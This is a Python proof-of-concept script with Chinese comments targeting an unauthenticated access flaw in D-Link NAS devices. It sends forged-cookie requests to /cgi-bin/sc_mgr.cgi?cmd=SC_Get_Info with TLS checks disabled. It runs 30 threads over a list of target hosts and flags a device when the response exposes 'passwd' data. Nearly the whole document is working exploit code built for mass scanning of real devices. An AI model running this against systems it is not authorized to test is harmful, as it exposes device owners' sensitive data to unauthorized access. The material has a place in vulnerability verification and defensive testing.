#D-Link NAS设备 sc_mgr.cgi 未授权漏洞

#D-Link NAS设备 /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info 接口存在未授权漏洞，
# 未经身份验证的远程攻击者可利用此漏洞在未登录且获知业务功能页面的访问地址前提下，
# 直接访问未授权的页面、目录或资源，获取系统中的敏感信息

import requests
import sys
import argparse
from multiprocessing.dummy import Pool

# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings()

def main():
    # 设置命令行参数
    parse = argparse.ArgumentParser(description="D-Link NAS设备 sc_mgr.cgi 未授权漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')

    args = parse.parse_args()
    url = args.url
    file = args.file
    targets = []
    pool = Pool(30)  # 使用线程池，最大并发数为 30

    if args.url:
        check(args.url)
    elif file:
        f = open(file, 'r')
        for i in f.readlines():
            i = i.strip()
            if 'http' in i:
                targets.append(i)
            else:
                i = f'http://{i}'
                targets.append(i)

        pool.map(check, targets)
        pool.close()  # 关闭线程池
        pool.join()   # 等待所有线程执行完毕

def check(target):
    target = f"{target}/cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Cookie': 'username=mopfdfsewo; id=mopfdfsewo; echo=mopfdfsewo;'
    }

    try:
        # 发起 GET 请求，禁用 SSL 验证
        response = requests.get(target, headers=headers, verify=False, timeout=8)
        if response.status_code == 200 and 'passwd' in response.text:
            print(f"[*] {target} 存在未授权漏洞")
        else:
            print(f"[!] {target} 不存在未授权漏洞")
    except requests.exceptions.RequestException as e:
        # 处理请求错误（如连接超时等）
        print(f"[Error] {target} Request failed: {e}")

if __name__ == '__main__':
    main()
